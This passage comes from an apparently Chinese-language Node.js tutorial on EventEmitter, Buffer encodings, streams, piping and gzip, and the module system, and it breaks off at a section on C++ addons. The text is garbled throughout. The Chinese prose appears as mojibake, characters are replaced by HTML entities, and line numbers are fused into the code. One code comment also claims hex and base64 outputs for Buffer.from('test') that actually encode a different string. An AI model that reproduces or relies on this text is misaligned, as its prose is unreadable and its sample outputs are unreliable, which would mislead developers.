è¿è¡Œç»“æœä¸­å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªäº‹ä»¶ç›‘å¬å™¨å›è°ƒå‡½æ•°è¢«å…ˆåè°ƒç”¨ã€‚ è¿™å°±æ˜¯EventEmitteræœ€ç®€å•çš„ç”¨æ³•ã€‚ EventEmitter æä¾›äº†å¤šä¸ªå±æ€§ï¼Œå¦‚ on å’Œ emitã€‚on å‡½æ•°ç”¨äºç»‘å®šäº‹ä»¶å‡½æ•°ï¼Œemit å±æ€§ç”¨äºè§¦å‘ä¸€ä¸ªäº‹ä»¶ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å…·ä½“çœ‹ä¸‹ EventEmitter çš„å±æ€§ä»‹ç»ã€‚ .once ç›‘å¬å™¨æœ€å¤šåªä¼šè§¦å‘ä¸€æ¬¡ï¼Œè§¦å‘åç«‹åˆ»è§£é™¤è¯¥ç›‘å¬å™¨ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849var events = require(&#x27;events&#x27;);var eventEmitter = new events.EventEmitter();// ç›‘å¬å™¨ #1var listener1 = function listener1() &#123; console.log(&#x27;ç›‘å¬å™¨ listener1 æ‰§è¡Œã€‚&#x27;);&#125;// ç›‘å¬å™¨ #2var listener2 = function listener2() &#123; console.log(&#x27;ç›‘å¬å™¨ listener2 æ‰§è¡Œã€‚&#x27;);&#125;// ç»‘å®š connection äº‹ä»¶ï¼Œå¤„ç†å‡½æ•°ä¸º listener1 eventEmitter.addListener(&#x27;connection&#x27;, listener1);// ç»‘å®š connection äº‹ä»¶ï¼Œå¤„ç†å‡½æ•°ä¸º listener2eventEmitter.on(&#x27;connection&#x27;, listener2);var eventListeners = eventEmitter.listenerCount(&#x27;connection&#x27;);console.log(eventListeners + &quot; ä¸ªç›‘å¬å™¨ç›‘å¬è¿æ¥äº‹ä»¶ã€‚&quot;);// å¤„ç† connection äº‹ä»¶ eventEmitter.emit(&#x27;connection&#x27;);// ç§»é™¤ç›‘ç»‘å®šçš„ listener1 å‡½æ•°eventEmitter.removeListener(&#x27;connection&#x27;, listener1);console.log(&quot;listener1 ä¸å†å—ç›‘å¬ã€‚&quot;);// è§¦å‘è¿æ¥äº‹ä»¶eventEmitter.emit(&#x27;connection&#x27;);eventListeners = eventEmitter.listenerCount(&#x27;connection&#x27;);console.log(eventListeners + &quot; ä¸ªç›‘å¬å™¨ç›‘å¬è¿æ¥äº‹ä»¶ã€‚&quot;);// ç»‘å®š connection äº‹ä»¶ï¼Œå¤„ç†å‡½æ•°ä¸º listener2eventEmitter.on(&#x27;connection&#x27;, listener2);eventEmitter.emit(&#x27;connection&#x27;);eventListeners = eventEmitter.listenerCount(&#x27;connection&#x27;);console.log(eventListeners + &quot; ä¸ªç›‘å¬å™¨ç›‘å¬è¿æ¥äº‹ä»¶ã€‚&quot;);console.log(&quot;ç¨‹åºæ‰§è¡Œå®Œæ¯•ã€‚&quot;); error äº‹ä»¶ EventEmitter å®šä¹‰äº†ä¸€ä¸ªç‰¹æ®Šçš„äº‹ä»¶ errorï¼Œå®ƒåŒ…å«äº†é”™è¯¯çš„è¯­ä¹‰ï¼Œæˆ‘ä»¬åœ¨é‡åˆ° å¼‚å¸¸çš„æ—¶å€™é€šå¸¸ä¼šè§¦å‘ error äº‹ä»¶ã€‚ å½“ error è¢«è§¦å‘æ—¶ï¼ŒEventEmitter è§„å®šå¦‚æœæ²¡æœ‰å“ åº”çš„ç›‘å¬å™¨ï¼ŒNode.js ä¼šæŠŠå®ƒå½“ä½œå¼‚å¸¸ï¼Œé€€å‡ºç¨‹åºå¹¶è¾“å‡ºé”™è¯¯ä¿¡æ¯ã€‚ æˆ‘ä»¬ä¸€èˆ¬è¦ä¸ºä¼šè§¦å‘ error äº‹ä»¶çš„å¯¹è±¡è®¾ç½®ç›‘å¬å™¨ï¼Œé¿å…é‡åˆ°é”™è¯¯åæ•´ä¸ªç¨‹åºå´©æºƒã€‚ä¾‹å¦‚ï¼š ç»§æ‰¿ EventEmitter å¤§å¤šæ•°æ—¶å€™æˆ‘ä»¬ä¸ä¼šç›´æ¥ä½¿ç”¨ EventEmitterï¼Œè€Œæ˜¯åœ¨å¯¹è±¡ä¸­ç»§æ‰¿å®ƒã€‚åŒ…æ‹¬ fsã€netã€ http åœ¨å†…çš„ï¼Œåªè¦æ˜¯æ”¯æŒäº‹ä»¶å“åº”çš„æ ¸å¿ƒæ¨¡å—éƒ½æ˜¯ EventEmitter çš„å­ç±»ã€‚ ä¸ºä»€ä¹ˆè¦è¿™æ ·åšå‘¢ï¼ŸåŸå› æœ‰ä¸¤ç‚¹ï¼š é¦–å…ˆï¼Œå…·æœ‰æŸä¸ªå®ä½“åŠŸèƒ½çš„å¯¹è±¡å®ç°äº‹ä»¶ç¬¦åˆè¯­ä¹‰ï¼Œ äº‹ä»¶çš„ç›‘å¬å’Œå‘ç”Ÿåº”è¯¥æ˜¯ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ã€‚ å…¶æ¬¡ JavaScript çš„å¯¹è±¡æœºåˆ¶æ˜¯åŸºäºåŸå‹çš„ï¼Œæ”¯æŒ éƒ¨åˆ†å¤šé‡ç»§æ‰¿ï¼Œç»§æ‰¿ EventEmitter ä¸ä¼šæ‰“ä¹±å¯¹è±¡åŸæœ‰çš„ç»§æ‰¿å…³ç³»ã€‚ â› Node.js Buffer JavaScript è¯­è¨€è‡ªèº«åªæœ‰å­—ç¬¦ä¸²æ•°æ®ç±»å‹ï¼Œæ²¡æœ‰äºŒè¿›åˆ¶æ•°æ®ç±»å‹ã€‚ ä½†åœ¨å¤„ç†åƒTCPæµæˆ–æ–‡ä»¶æµæ—¶ï¼Œå¿…é¡»ä½¿ç”¨åˆ°äºŒè¿›åˆ¶æ•°æ®ã€‚å› æ­¤åœ¨ Node.jsä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ª Buffer ç±»ï¼Œè¯¥ç±»ç”¨æ¥åˆ›å»ºä¸€ä¸ªä¸“é—¨å­˜æ”¾äºŒè¿›åˆ¶æ•°æ®çš„ç¼“å­˜åŒºã€‚ åœ¨ Node.js ä¸­ï¼ŒBuffer ç±»æ˜¯éš Node å†…æ ¸ä¸€èµ·å‘å¸ƒçš„æ ¸å¿ƒåº“ã€‚Buffer åº“ä¸º Node.js å¸¦æ¥äº†ä¸€ç§å­˜å‚¨åŸå§‹æ•°æ®çš„æ–¹æ³•ï¼Œå¯ä»¥è®© Node.js å¤„ç†äºŒè¿›åˆ¶æ•°æ®ï¼Œæ¯å½“éœ€è¦åœ¨ Node.js ä¸­å¤„ç†I&#x2F;Oæ“ä½œä¸­ç§»åŠ¨çš„æ•°æ®æ—¶ï¼Œå°±æœ‰å¯èƒ½ä½¿ç”¨ Buffer åº“ã€‚åŸå§‹æ•°æ®å­˜å‚¨åœ¨ Buffer ç±»çš„å®ä¾‹ä¸­ã€‚ä¸€ä¸ª Buffer ç±»ä¼¼äºä¸€ä¸ªæ•´æ•°æ•°ç»„ï¼Œä½†å®ƒå¯¹åº”äº V8 å †å†…å­˜ä¹‹å¤–çš„ä¸€å—åŸå§‹å†…å­˜ã€‚ Buffer ä¸å­—ç¬¦ç¼–ç  Buffer å®ä¾‹ä¸€èˆ¬ç”¨äºè¡¨ç¤ºç¼–ç å­—ç¬¦çš„åºåˆ—ï¼Œæ¯”å¦‚ UTF-8 ã€ UCS2 ã€ Base64 ã€æˆ–åå…­è¿›åˆ¶ç¼–ç çš„æ•°æ®ã€‚ é€šè¿‡ä½¿ç”¨æ˜¾å¼çš„å­—ç¬¦ç¼–ç ï¼Œå°±å¯ä»¥åœ¨ Buffer å®ä¾‹ä¸æ™®é€šçš„ JavaScript å­—ç¬¦ä¸²ä¹‹é—´è¿›è¡Œç›¸äº’è½¬æ¢ã€‚ Buffer.from() åˆ›å»ºå¯¹è±¡ 1234567891011121314151617181920const buf = Buffer.from(&#x27;test&#x27;, &#x27;ascii&#x27;);// è¾“å‡º 72756e6f6f62console.log(buf.toString(&#x27;hex&#x27;));// è¾“å‡º cnVub29iconsole.log(buf.toString(&#x27;base64&#x27;));//UTF-8console.log(buf.toString(&#x27;UTF-8&#x27;));//ascii console.log(buf.toString(&#x27;ascii&#x27;)); //utf16le console.log(buf.toString(&#x27;utf16le&#x27;)); //latin1 console.log(buf.toString(&#x27;latin1&#x27;)); Node.js ç›®å‰æ”¯æŒçš„å­—ç¬¦ç¼–ç åŒ…æ‹¬ï¼š ascii - ä»…æ”¯æŒ 7 ä½ ASCII æ•°æ®ã€‚å¦‚æœè®¾ç½®å»æ‰é«˜ä½çš„è¯ï¼Œè¿™ç§ç¼–ç æ˜¯éå¸¸å¿«çš„ã€‚ utf8 - å¤šå­—èŠ‚ç¼–ç çš„ Unicode å­—ç¬¦ã€‚è®¸å¤šç½‘é¡µå’Œå…¶ä»–æ–‡æ¡£æ ¼å¼éƒ½ä½¿ç”¨ UTF-8 ã€‚ utf16le - 2 æˆ– 4 ä¸ªå­—èŠ‚ï¼Œå°å­—èŠ‚åºç¼–ç çš„ Unicode å­—ç¬¦ã€‚æ”¯æŒä»£ç†å¯¹ï¼ˆU+10000 è‡³ U+10FFFFï¼‰ã€‚ ucs2 - utf16le çš„åˆ«åã€‚ base64 - Base64 ç¼–ç ã€‚ latin1 - ä¸€ç§æŠŠ Buffer ç¼–ç æˆä¸€å­—èŠ‚ç¼–ç çš„å­—ç¬¦ä¸²çš„æ–¹å¼ã€‚ binary - latin1 çš„åˆ«åã€‚ hex - å°†æ¯ä¸ªå­—èŠ‚ç¼–ç ä¸ºä¸¤ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ã€‚ åˆ›å»º Buffer ç±» Buffer æä¾›äº†ä»¥ä¸‹ API æ¥åˆ›å»º Buffer ç±»ï¼š Buffer.alloc(size[, fill[, encoding]])ï¼š è¿”å›ä¸€ä¸ªæŒ‡å®šå¤§å°çš„ Buffer å®ä¾‹ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½® fillï¼Œåˆ™é»˜è®¤å¡«æ»¡ 0 Buffer.allocUnsafe(size)ï¼š è¿”å›ä¸€ä¸ªæŒ‡å®šå¤§å°çš„ Buffer å®ä¾‹ï¼Œä½†æ˜¯å®ƒä¸ä¼šè¢«åˆå§‹åŒ–ï¼Œæ‰€ä»¥å®ƒå¯èƒ½åŒ…å«æ•æ„Ÿçš„æ•°æ® Buffer.allocUnsafeSlow(size) Buffer.from(array)ï¼š è¿”å›ä¸€ä¸ªè¢« array çš„å€¼åˆå§‹åŒ–çš„æ–°çš„ Buffer å®ä¾‹ï¼ˆä¼ å…¥çš„ array çš„å…ƒç´ åªèƒ½æ˜¯æ•°å­—ï¼Œä¸ç„¶å°±ä¼šè‡ªåŠ¨è¢« 0 è¦†ç›–ï¼‰ Buffer.from(arrayBuffer[, byteOffset[, length]])ï¼š è¿”å›ä¸€ä¸ªæ–°å»ºçš„ä¸ç»™å®šçš„ ArrayBuffer å…±äº«åŒä¸€å†…å­˜çš„ Bufferã€‚ Buffer.from(buffer)ï¼š å¤åˆ¶ä¼ å…¥çš„ Buffer å®ä¾‹çš„æ•°æ®ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–°çš„ Buffer å®ä¾‹ Buffer.from(string[, encoding])ï¼š è¿”å›ä¸€ä¸ªè¢« string çš„å€¼åˆå§‹åŒ–çš„æ–°çš„ Buffer å®ä¾‹ å†™å…¥ç¼“å†²åŒº è¯­æ³• å†™å…¥ Node ç¼“å†²åŒºçš„è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š 12buf.write(string[, offset[, length]][, encoding]) å‚æ•° å‚æ•°æè¿°å¦‚ä¸‹ï¼š string - å†™å…¥ç¼“å†²åŒºçš„å­—ç¬¦ä¸²ã€‚ offset - ç¼“å†²åŒºå¼€å§‹å†™å…¥çš„ç´¢å¼•å€¼ï¼Œé»˜è®¤ä¸º 0 ã€‚ length - å†™å…¥çš„å­—èŠ‚æ•°ï¼Œé»˜è®¤ä¸º buffer.length encoding - ä½¿ç”¨çš„ç¼–ç ã€‚é»˜è®¤ä¸º â€˜utf8â€™ ã€‚ æ ¹æ® encoding çš„å­—ç¬¦ç¼–ç å†™å…¥ string åˆ° buf ä¸­çš„ offset ä½ç½®ã€‚ length å‚æ•°æ˜¯å†™å…¥çš„å­—èŠ‚æ•°ã€‚ å¦‚æœ buf æ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´ä¿å­˜æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ™åªä¼šå†™å…¥ string çš„ä¸€éƒ¨åˆ†ã€‚ åªéƒ¨åˆ†è§£ç çš„å­—ç¬¦ä¸ä¼šè¢«å†™å…¥ã€‚ è¿”å›å€¼ è¿”å›å®é™…å†™å…¥çš„å¤§å°ã€‚å¦‚æœ buffer ç©ºé—´ä¸è¶³ï¼Œ åˆ™åªä¼šå†™å…¥éƒ¨åˆ†å­—ç¬¦ä¸²ã€‚ å®ä¾‹ 1234buf = Buffer.alloc(256);len = buf.write(&quot;123123&quot;);console.log(&quot;å†™å…¥å­—èŠ‚æ•° : &quot;+ len); ä»ç¼“å†²åŒºè¯»å–æ•°æ® è¯­æ³• è¯»å– Node ç¼“å†²åŒºæ•°æ®çš„è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š 1buf.toString([encoding[, start[, end]]]) å‚æ•° å‚æ•°æè¿°å¦‚ä¸‹ï¼š encoding - ä½¿ç”¨çš„ç¼–ç ã€‚é»˜è®¤ä¸º â€˜utf8â€™ ã€‚ start - æŒ‡å®šå¼€å§‹è¯»å–çš„ç´¢å¼•ä½ç½®ï¼Œé»˜è®¤ä¸º 0ã€‚ end - ç»“æŸä½ç½®ï¼Œé»˜è®¤ä¸ºç¼“å†²åŒºçš„æœ«å°¾ã€‚ è¿”å›å€¼ è§£ç ç¼“å†²åŒºæ•°æ®å¹¶ä½¿ç”¨æŒ‡å®šçš„ç¼–ç è¿”å›å­—ç¬¦ä¸²ã€‚ å®ä¾‹ 12345678910buf = Buffer.alloc(26);for (var i = 0 ; i &lt; 26 ; i++) &#123; buf[i] = i + 97;&#125;console.log( buf.toString(&#x27;ascii&#x27;)); // è¾“å‡º: abcdefghijklmnopqrstuvwxyzconsole.log( buf.toString(&#x27;ascii&#x27;,0,5)); //ä½¿ç”¨ &#x27;ascii&#x27; ç¼–ç , å¹¶è¾“å‡º: abcdeconsole.log( buf.toString(&#x27;utf8&#x27;,0,5)); // ä½¿ç”¨ &#x27;utf8&#x27; ç¼–ç , å¹¶è¾“å‡º: abcdeconsole.log( buf.toString(undefined,0,5)); // ä½¿ç”¨é»˜è®¤çš„ &#x27;utf8&#x27; ç¼–ç , å¹¶è¾“å‡º: abcde å°† Buffer è½¬æ¢ä¸º JSON å¯¹è±¡ è¯­æ³• å°† Node Buffer è½¬æ¢ä¸º JSON å¯¹è±¡çš„å‡½æ•°è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1buf.toJSON() 123456789101112131415const buf = Buffer.from([0x1, 0x2, 0x3, 0x4, 0x5]);const json = JSON.stringify(buf);// è¾“å‡º: &#123;&quot;type&quot;:&quot;Buffer&quot;,&quot;data&quot;:[1,2,3,4,5]&#125;console.log(json);const copy = JSON.parse(json, (key, value) =&gt; &#123; return value &amp;&amp; value.type === &#x27;Buffer&#x27; ? Buffer.from(value.data) : value;&#125;);// è¾“å‡º: &lt;Buffer 01 02 03 04 05&gt;console.log(copy); ç¼“å†²åŒºåˆå¹¶ è¯­æ³• Node ç¼“å†²åŒºåˆå¹¶çš„è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š 1Buffer.concat(list[, totalLength]) 1234567var buffer1 = Buffer.from((&#x27;123&#x27;));var buffer2 = Buffer.from((&#x27;test&#x27;));var buffer3 = Buffer.concat([buffer1,buffer2]);console.log(&quot;buffer3 å†…å®¹: &quot; + buffer3.toString()); ç¼“å†²åŒºæ¯”è¾ƒ è¯­æ³• Node Buffer æ¯”è¾ƒçš„å‡½æ•°è¯­æ³•å¦‚ä¸‹æ‰€ç¤º, è¯¥æ–¹æ³•åœ¨ Node.js v0.12.2 ç‰ˆæœ¬å¼•å…¥ï¼š 12buf.compare(otherBuffer); 12345678910111213var buffer1 = Buffer.from(&#x27;ABC&#x27;);var buffer2 = Buffer.from(&#x27;ABCD&#x27;);var result = buffer1.compare(buffer2);if(result &lt; 0) &#123; console.log(buffer1 + &quot; åœ¨ &quot; + buffer2 + &quot;ä¹‹å‰&quot;);&#125;else if(result == 0)&#123; console.log(buffer1 + &quot; ä¸ &quot; + buffer2 + &quot;ç›¸åŒ&quot;);&#125;else &#123; console.log(buffer1 + &quot; åœ¨ &quot; + buffer2 + &quot;ä¹‹å&quot;);&#125; æ‹·è´ç¼“å†²åŒº è¯­æ³• Node ç¼“å†²åŒºæ‹·è´è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š 1buf.copy(targetBuffer[, targetStart[, sourceStart[, sourceEnd]]]) 12345678var buf1 = Buffer.from(&#x27;abcdefghijkl&#x27;);var buf2 = Buffer.from(&#x27;123&#x27;);//å°† buf2 æ’å…¥åˆ° buf1 æŒ‡å®šä½ç½®ä¸Šbuf2.copy(buf1, 2);console.log(buf1.toString()); ç¼“å†²åŒºè£å‰ª Node ç¼“å†²åŒºè£å‰ªè¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š 12buf.slice([start[, end]]) 12345var buffer1 = Buffer.from(&#x27;TEST123TEST&#x27;);// å‰ªåˆ‡ç¼“å†²åŒºvar buffer2 = buffer1.slice(0,2);console.log(&quot;buffer2 content: &quot; + buffer2.toString()); ç¼“å†²åŒºé•¿åº¦ è¯­æ³• Node ç¼“å†²åŒºé•¿åº¦è®¡ç®—è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š 1buf.length; 12345var buffer = Buffer.from(&#x27;123123123&#x27;);// ç¼“å†²åŒºé•¿åº¦console.log(&quot;buffer length: &quot; + buffer.length); ğŸ‘¨â€ğŸ’»Node.js Stream Node.js Stream(æµ) Stream æ˜¯ä¸€ä¸ªæŠ½è±¡æ¥å£ï¼ŒNode ä¸­æœ‰å¾ˆå¤šå¯¹è±¡å®ç°äº†è¿™ä¸ªæ¥å£ã€‚ä¾‹å¦‚ï¼Œå¯¹http æœåŠ¡å™¨å‘èµ·è¯·æ±‚çš„request å¯¹è±¡å°±æ˜¯ä¸€ä¸ª Streamï¼Œè¿˜æœ‰stdoutï¼ˆæ ‡å‡†è¾“å‡ºï¼‰ã€‚ Node.jsï¼ŒStream æœ‰å››ç§æµç±»å‹ï¼š Readable - å¯è¯»æ“ä½œã€‚ Writable - å¯å†™æ“ä½œã€‚ Duplex - å¯è¯»å¯å†™æ“ä½œ. Transform - æ“ä½œè¢«å†™å…¥æ•°æ®ï¼Œç„¶åè¯»å‡ºç»“æœã€‚ æ‰€æœ‰çš„ Stream å¯¹è±¡éƒ½æ˜¯ EventEmitter çš„å®ä¾‹ã€‚å¸¸ç”¨çš„äº‹ä»¶æœ‰ï¼š data - å½“æœ‰æ•°æ®å¯è¯»æ—¶è§¦å‘ã€‚ end - æ²¡æœ‰æ›´å¤šçš„æ•°æ®å¯è¯»æ—¶è§¦å‘ã€‚ error - åœ¨æ¥æ”¶å’Œå†™å…¥è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯æ—¶è§¦å‘ã€‚ finish - æ‰€æœ‰æ•°æ®å·²è¢«å†™å…¥åˆ°åº•å±‚ç³»ç»Ÿæ—¶è§¦å‘ã€‚ 123456789101112131415161718192021222324var fs = require(&quot;fs&quot;);var data = &#x27;&#x27;;// åˆ›å»ºå¯è¯»æµvar readerStream = fs.createReadStream(&#x27;x.txt&#x27;);// è®¾ç½®ç¼–ç ä¸º utf8ã€‚readerStream.setEncoding(&#x27;UTF8&#x27;);// å¤„ç†æµäº‹ä»¶ --&gt; data, end, and errorreaderStream.on(&#x27;data&#x27;, function(chunk) &#123; data += chunk;&#125;);readerStream.on(&#x27;end&#x27;,function()&#123; console.log(data);&#125;);readerStream.on(&#x27;error&#x27;, function(err)&#123; console.log(err.stack);&#125;);console.log(&quot;ç¨‹åºæ‰§è¡Œå®Œæ¯•&quot;); å†™å…¥æµ 1234567891011var fs = require(&quot;fs&quot;);var data = &#x27;&#x27;;var dataw = &#x27;w123w&#x27;;var ws = fs.createWriteStream(&#x27;x.txt&#x27;);ws.write(dataw); ws.end();console.log(&quot;æ•°æ®å†™å…¥æˆåŠŸï¼&quot;); ç®¡é“æµ ç®¡é“æä¾›äº†ä¸€ä¸ªè¾“å‡ºæµåˆ°è¾“å…¥æµçš„æœºåˆ¶ã€‚é€šå¸¸æˆ‘ä»¬ç”¨äºä»ä¸€ä¸ªæµä¸­è·å–æ•°æ®å¹¶å°†æ•°æ®ä¼ é€’åˆ°å¦å¤–ä¸€ä¸ªæµä¸­ã€‚ 12345678910111213var fs = require(&quot;fs&quot;);// åˆ›å»ºä¸€ä¸ªå¯è¯»æµvar readerStream = fs.createReadStream(&#x27;x.txt&#x27;);// åˆ›å»ºä¸€ä¸ªå¯å†™æµvar writerStream = fs.createWriteStream(&#x27;output.txt&#x27;);// ç®¡é“è¯»å†™æ“ä½œ// è¯»å– input.txt æ–‡ä»¶å†…å®¹ï¼Œå¹¶å°†å†…å®¹å†™å…¥åˆ° output.txt æ–‡ä»¶ä¸­readerStream.pipe(writerStream);console.log(&quot;ç¨‹åºæ‰§è¡Œå®Œæ¯•&quot;); é“¾å¼æµ é“¾å¼æ˜¯é€šè¿‡è¿æ¥è¾“å‡ºæµåˆ°å¦å¤–ä¸€ä¸ªæµå¹¶åˆ›å»ºå¤šä¸ªæµæ“ä½œé“¾çš„æœºåˆ¶ã€‚é“¾å¼æµä¸€èˆ¬ç”¨äºç®¡é“æ“ä½œã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬å°±æ˜¯ç”¨ç®¡é“å’Œé“¾å¼æ¥å‹ç¼©å’Œè§£å‹æ–‡ä»¶ã€‚ 12345678910var fs = require(&quot;fs&quot;);var zlib = require(&#x27;zlib&#x27;);// å‹ç¼© input.txt æ–‡ä»¶ä¸º input.txt.gzfs.createReadStream(&#x27;x.txt&#x27;) .pipe(zlib.createGzip()).pipe(fs.createWriteStream(&#x27;input.txt.gz&#x27;)); console.log(&quot;æ–‡ä»¶å‹ç¼©å®Œæˆã€‚&quot;); 12345678910var fs = require(&quot;fs&quot;);var zlib = require(&#x27;zlib&#x27;);// è§£å‹ input.txt.gz æ–‡ä»¶ä¸º input.txtfs.createReadStream(&#x27;input.txt.gz&#x27;) .pipe(zlib.createGunzip()) .pipe(fs.createWriteStream(&#x27;input2.txt&#x27;)); console.log(&quot;æ–‡ä»¶è§£å‹å®Œæˆã€‚&quot;); ğŸ“Node.js æ¨¡å—ç³»ç»Ÿ ~~ ä¸ºäº†è®©Node.jsçš„æ–‡ä»¶å¯ä»¥ç›¸äº’è°ƒç”¨ï¼ŒNode.jsæä¾›äº†ä¸€ä¸ªç®€å•çš„æ¨¡å—ç³»ç»Ÿã€‚ æ¨¡å—æ˜¯Node.js åº”ç”¨ç¨‹åºçš„åŸºæœ¬ç»„æˆéƒ¨åˆ†ï¼Œæ–‡ä»¶å’Œæ¨¡å—æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚æ¢è¨€ä¹‹ï¼Œä¸€ä¸ª Node.js æ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œè¿™ä¸ªæ–‡ä»¶å¯èƒ½æ˜¯JavaScript ä»£ç ã€JSON æˆ–è€…ç¼–è¯‘è¿‡çš„C&#x2F;C++ æ‰©å±•ã€‚ 12345//hello.jsexports.world1 = function() &#123; console.log(&quot;hello world node.js &quot;) &#125; 123//test.jsvar hello = require(&#x27;./hello&#x27;);hello.world1(); hello.js é€šè¿‡ exports å¯¹è±¡æŠŠ world1 ä½œä¸ºæ¨¡å—çš„è®¿é—®æ¥å£ï¼Œåœ¨ main.js ä¸­é€šè¿‡ require(â€˜.&#x2F;helloâ€™) åŠ è½½è¿™ä¸ªæ¨¡å—ï¼Œç„¶åå°±å¯ä»¥ç›´æ¥è®¿ é—® hello.js ä¸­ exports å¯¹è±¡çš„æˆå‘˜å‡½æ•°äº†ã€‚ 123456789101112//hello.js function Hello() &#123; var name; this.setName = function(thyName) &#123; name = thyName; &#125;; this.sayHello = function() &#123; console.log(&#x27;Hello &#x27; + name); &#125;; &#125;; module.exports = Hello; 12345//test.js var Hello = require(&#x27;./hello&#x27;); hello = new Hello(); hello.setName(&#x27;vvv&#x27;); hello.sayHello(); æ¨¡å—æ¥å£çš„å”¯ä¸€å˜åŒ–æ˜¯ä½¿ç”¨ module.exports &#x3D; Hello ä»£æ›¿äº†exports.world &#x3D; function(){}ã€‚ åœ¨å¤–éƒ¨å¼•ç”¨è¯¥æ¨¡å—æ—¶ï¼Œå…¶æ¥å£å¯¹è±¡å°±æ˜¯è¦è¾“å‡ºçš„ Hello å¯¹è±¡æœ¬èº«ï¼Œè€Œä¸æ˜¯åŸå…ˆçš„ exportsã€‚ exports å’Œ module.exports çš„ä½¿ç”¨ å¦‚æœè¦å¯¹å¤–æš´éœ²å±æ€§æˆ–æ–¹æ³•ï¼Œå°±ç”¨ exports å°±è¡Œï¼Œè¦æš´éœ²å¯¹è±¡(ç±»ä¼¼classï¼ŒåŒ…å«äº†å¾ˆå¤šå±æ€§å’Œæ–¹æ³•)ï¼Œå°±ç”¨ module.exportsã€‚ PS æ¨¡å—åŠ è½½ ä»æ–‡ä»¶æ¨¡å—ç¼“å­˜ä¸­åŠ è½½ å°½ç®¡åŸç”Ÿæ¨¡å—ä¸æ–‡ä»¶æ¨¡å—çš„ä¼˜å…ˆçº§ä¸åŒï¼Œä½†æ˜¯éƒ½ä¼šä¼˜å…ˆä»æ–‡ä»¶æ¨¡å—çš„ç¼“å­˜ä¸­åŠ è½½å·²ç»å­˜åœ¨çš„æ¨¡å—ã€‚ ä»åŸç”Ÿæ¨¡å—åŠ è½½ åŸç”Ÿæ¨¡å—çš„ä¼˜å…ˆçº§ä»…æ¬¡äºæ–‡ä»¶æ¨¡å—ç¼“å­˜çš„ä¼˜å…ˆçº§ã€‚require æ–¹æ³•åœ¨è§£ææ–‡ä»¶åä¹‹åï¼Œä¼˜å…ˆæ£€æŸ¥æ¨¡å—æ˜¯å¦åœ¨åŸç”Ÿæ¨¡å—åˆ—è¡¨ä¸­ã€‚ä»¥httpæ¨¡å—ä¸ºä¾‹ï¼Œå°½ç®¡åœ¨ç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ª http&#x2F;http.js&#x2F;http.node&#x2F;http.json æ–‡ä»¶ï¼Œrequire(â€œhttpâ€) éƒ½ä¸ä¼šä»è¿™äº›æ–‡ä»¶ä¸­åŠ è½½ï¼Œè€Œæ˜¯ä»åŸç”Ÿæ¨¡å—ä¸­åŠ è½½ã€‚ åŸç”Ÿæ¨¡å—ä¹Ÿæœ‰ä¸€ä¸ªç¼“å­˜åŒºï¼ŒåŒæ ·ä¹Ÿæ˜¯ä¼˜å…ˆä»ç¼“å­˜åŒºåŠ è½½ã€‚å¦‚æœç¼“å­˜åŒºæ²¡æœ‰è¢«åŠ è½½è¿‡ï¼Œåˆ™è°ƒç”¨åŸç”Ÿæ¨¡å—çš„åŠ è½½æ–¹å¼è¿›è¡ŒåŠ è½½å’Œæ‰§è¡Œã€‚ ä»æ–‡ä»¶åŠ è½½ å½“æ–‡ä»¶æ¨¡å—ç¼“å­˜ä¸­ä¸å­˜åœ¨ï¼Œè€Œä¸”ä¸æ˜¯åŸç”Ÿæ¨¡å—çš„æ—¶å€™ï¼ŒNode.js ä¼šè§£æ require æ–¹æ³•ä¼ å…¥çš„å‚æ•°ï¼Œå¹¶ä»æ–‡ä»¶ç³»ç»Ÿä¸­åŠ è½½å®é™…çš„æ–‡ä»¶ï¼ŒåŠ è½½è¿‡ç¨‹ä¸­çš„åŒ…è£…å’Œç¼–è¯‘ç»†èŠ‚åœ¨å‰ä¸€èŠ‚ä¸­å·²ç»ä»‹ç»è¿‡ï¼Œè¿™é‡Œæˆ‘ä»¬å°†è¯¦ç»†æè¿°æŸ¥æ‰¾æ–‡ä»¶æ¨¡å—çš„è¿‡ç¨‹ï¼Œå…¶ä¸­ï¼Œä¹Ÿæœ‰ä¸€äº›ç»†èŠ‚å€¼å¾—çŸ¥æ™“ã€‚ requireæ–¹æ³•æ¥å—ä»¥ä¸‹å‡ ç§å‚æ•°çš„ä¼ é€’ï¼š httpã€fsã€pathç­‰ï¼ŒåŸç”Ÿæ¨¡å—ã€‚ .&#x2F;modæˆ–..&#x2F;modï¼Œç›¸å¯¹è·¯å¾„çš„æ–‡ä»¶æ¨¡å—ã€‚ &#x2F;pathtomodule&#x2F;modï¼Œç»å¯¹è·¯å¾„çš„æ–‡ä»¶æ¨¡å—ã€‚ modï¼ŒéåŸç”Ÿæ¨¡å—çš„æ–‡ä»¶æ¨¡å—ã€‚ ğŸ”„nodejs åŠ è½½c++ åœ¨Node.jsä¸­åŠ è½½C++ä»£ç ï¼Œé€šå¸¸æ˜¯é€šè¿‡ç¼–å†™ä¸€ä¸ªC++çš„æ‰©å±•æ¨¡å—ï¼Œç„¶åé€šè¿‡Node.jsçš„requireæ–¹æ³•åŠ 